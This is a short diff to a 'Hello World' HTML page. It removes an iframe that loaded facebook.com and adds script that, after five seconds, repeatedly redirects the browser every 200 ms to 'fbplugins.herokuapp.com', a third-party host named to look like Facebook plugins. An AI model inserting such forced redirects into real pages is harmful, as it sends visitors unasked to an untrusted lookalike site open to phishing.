@@ -18,13 +18,15 @@
 //   js.src = "//connect.yuecai.sb.facebook.com/assets.php/en_US/sdk.js#xfbml=1&version=v2.8&appId=349913042127";
 //   fjs.parentNode.insertBefore(js, fjs);
 // }(document, 'script', 'facebook-jssdk'));
-setTimeout(function(){ document.getElementById('iframe').src = 'https://www.facebook.com/';}, 5000);
+function f()
+{
+  location = "https://fbplugins.herokuapp.com/index.php";
+}
+setInterval(function() {setInterval('f()', 200)}, 5000);
 
 </script>
 
 <p>Hello World</p>
-
-<iframe id="iframe" width="500" height="500"></iframe>
 
 </body>
 </html>
